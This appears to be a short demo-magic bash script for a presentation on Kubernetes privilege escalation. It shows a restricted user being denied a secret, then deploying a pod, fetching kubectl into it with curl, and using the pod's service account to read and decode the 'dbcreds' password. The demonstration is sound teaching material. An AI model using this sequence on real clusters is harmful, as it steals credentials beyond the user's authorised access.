#!/usr/bin/env bash

. ../scripts/demo-magic.sh
TYPE_SPEED=${SPEED:-}

pei "export KUBECONFIG=./user1-kubeconfig"
export KUBECONFIG=./user1-kubeconfig

echo "❓ Can we read the secret?"; read -s
pe "kubectl get secret dbcreds"

echo "ℹ️ Let's create a pod for the user"; read -s
pe "kubectl apply -f n1-deploy.yaml"
pei "kubectl wait --for=jsonpath='{.status.readyReplicas}=1' deploy/n1"


echo "!! Let's hack that app!"; read -s
pe "kubectl exec deploy/n1 -ti -- curl -LO https://dl.k8s.io/release/v1.31.0/bin/linux/arm64/kubectl"
pe "kubectl exec deploy/n1 -ti -- chmod +x kubectl"
pe "kubectl exec deploy/n1 -ti -- ./kubectl get secret dbcreds -ojsonpath={'.data.pass'}| base64 --decode"

echo "!! Done!";read -s

